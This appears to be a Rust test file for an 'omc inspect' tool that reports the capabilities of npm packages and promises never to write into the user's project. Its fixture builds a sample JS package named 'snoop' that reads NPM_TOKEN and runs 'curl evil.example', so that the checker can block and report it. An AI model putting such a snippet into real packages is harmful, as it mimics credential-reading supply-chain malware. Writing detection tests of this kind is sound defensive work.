//! Tests for `omc inspect`: the verbose capability report and the read-only
//! (never-touch-the-user's-project) guarantee. Deterministic and network-free —
//! the verbose renderer is exercised against a `LinkReport` built from a real
//! LOCAL source compile (`compile_source_path`, no registry/network), and the
//! read-only path is checked on the pre-resolution error branch so no live
//! registry is ever contacted.

use super::*;

use std::path::PathBuf;

use omc_cap::Capability;
use omc_registry::{
    compile_source_path, Behavior, CompileSourceOptions, Ecosystem, LinkReport, LockedPackage,
    Verdict,
};

use crate::inspect::{run_inspect, InspectCommand};
use crate::render::format_link_report_verbose;

/// Compile a small JS source that reads an env var and spawns a process into a
/// real `OmcArtifact` (local, no network), then wrap it in a `LinkReport` so the
/// verbose renderer can be tested against true capability findings.
fn link_report_with_capabilities() -> LinkReport {
    let dir = test_dir("inspect-fixture-compile");
    let source = dir.join("source");
    fs::create_dir_all(&source).unwrap();
    fs::write(
        source.join("index.js"),
        "const cp = require('child_process');\n\
         const token = process.env.NPM_TOKEN;\n\
         cp.execSync('curl evil.example');\n",
    )
    .unwrap();

    let report = compile_source_path(CompileSourceOptions {
        project_dir: dir.clone(),
        source_path: source,
        ecosystem: Ecosystem::Npm,
        name: "snoop".to_owned(),
        version: "1.2.3".to_owned(),
        // No grants: env read + process spawn are denied by default, so the
        // package is Blocked and carries verifier findings — exactly the case
        // inspect must still report in full.
        allowed_capabilities: Vec::new(),
        allowed_flows: Vec::new(),
        write_artifact: false,
    })
    .unwrap();
    let artifact = report.artifact;

    assert!(
        !artifact.capabilities.is_empty(),
        "fixture must produce capability findings: {artifact:?}"
    );

    let locked = LockedPackage {
        ecosystem: Ecosystem::Npm,
        name: "snoop".to_owned(),
        version: "1.2.3".to_owned(),
        source_url: artifact.source_url.clone(),
        archive: "cache/snoop-1.2.3.tgz".to_owned(),
        artifact: ".omc/artifacts/snoop-1.2.3.json".to_owned(),
        sha256: "0".repeat(64),
        artifact_sha256: String::new(),
        behavior: artifact.behavior,
        verdict: artifact.verdict,
        dependencies: artifact.dependencies.clone(),
        optional_dependencies: artifact.optional_dependencies.clone(),
        peer_dependencies: artifact.peer_dependencies.clone(),
        grants: artifact.grants.clone(),
        capabilities: artifact.capabilities.clone(),
        verifier_findings: artifact.verifier_findings.clone(),
    };

    let link_report = LinkReport {
        locked,
        artifact,
        lockfile: PathBuf::from("/scratch/omc.lock"),
        manifest: PathBuf::from("/scratch/omc.toml"),
    };
    let _ = fs::remove_dir_all(&dir);
    link_report
}

#[test]
fn verbose_report_includes_full_capability_detail() {
    let report = link_report_with_capabilities();
    let rendered = format_link_report_verbose(&report);

    // Header with verdict + ecosystem-qualified name.
    assert!(
        rendered.contains("snoop@1.2.3"),
        "report names the package: {rendered}"
    );
    assert!(
        rendered.contains("npm:snoop"),
        "report is ecosystem-qualified: {rendered}"
    );

    // Artifact + archive + lockfile paths.
    assert!(rendered.contains("archive"), "report shows archive path");
    assert!(rendered.contains("artifact"), "report shows artifact path");

    // Every capability finding, with its kind, source file, and evidence.
    assert!(
        rendered.contains("capabilities:"),
        "report has a capabilities section: {rendered}"
    );
    for finding in &report.artifact.capabilities {
        assert!(
            rendered.contains(&finding.kind.to_string()),
            "capability kind {} present: {rendered}",
            finding.kind
        );
        assert!(
            rendered.contains(&finding.source),
            "capability source file {} present: {rendered}",
            finding.source
        );
        assert!(
            rendered.contains(&finding.evidence),
            "capability evidence {} present: {rendered}",
            finding.evidence
        );
    }

    // A blocked package must still surface its verifier findings under inspect.
    assert_eq!(report.locked.verdict, Verdict::Blocked);
    assert!(
        rendered.contains("verifier findings:"),
        "blocked package shows verifier findings: {rendered}"
    );
    for finding in &report.artifact.verifier_findings {
        assert!(
            rendered.contains(finding),
            "verifier finding {finding} present: {rendered}"
        );
    }
}

#[test]
fn verbose_report_lists_dependencies_when_present() {
    let mut report = link_report_with_capabilities();
    report.artifact.dependencies = vec!["npm:left-pad@1.3.0".to_owned()];
    report.locked.dependencies = report.artifact.dependencies.clone();

    let rendered = format_link_report_verbose(&report);
    assert!(
        rendered.contains("dependencies: npm:left-pad@1.3.0"),
        "dependency list rendered: {rendered}"
    );
}

#[test]
fn behavior_label_round_trips() {
    // Sanity that the constructed report uses host-capability behavior (it reads
    // env + spawns) and the renderer therefore exercises the non-pure path.
    let report = link_report_with_capabilities();
    assert!(matches!(report.locked.behavior, Behavior::HostCapability));
    let _ = Capability::FsRead("*".to_owned()); // ensure omc_cap is linked in test scope
}

/// READ-ONLY guarantee: an inspect invocation that fails before any registry
/// resolution (here, an unparseable spec) must not create `omc.lock` or
/// `node_modules` in the user's current working directory. This exercises the
/// no-write contract without contacting the network.
#[test]
fn inspect_never_writes_into_cwd_on_error_path() {
    let cwd = test_dir("inspect-cwd-untouched");
    // A spec with an unknown ecosystem prefix fails in parse_package_specs,
    // before any temp dir or network work.
    let result = with_env_lock(|| {
        let previous = env::current_dir().ok();
        env::set_current_dir(&cwd).unwrap();
        let result = run_inspect(InspectCommand {
            npm: false,
            pypi: false,
            specs: vec!["bogus-ecosystem:not-a-real-thing@9.9.9".to_owned()],
            allow: Vec::new(),
            allow_flow: Vec::new(),
            allow_all_host: false,
        });
        if let Some(previous) = previous {
            let _ = env::set_current_dir(previous);
        }
        result
    });

    assert!(
        result.is_err(),
        "an unparseable spec must error, not resolve"
    );
    assert!(
        !cwd.join("omc.lock").exists(),
        "inspect must not write omc.lock into the cwd"
    );
    assert!(
        !cwd.join("omc.toml").exists(),
        "inspect must not write omc.toml into the cwd"
    );
    assert!(
        !cwd.join("node_modules").exists(),
        "inspect must not create node_modules in the cwd"
    );

    let _ = fs::remove_dir_all(&cwd);
}
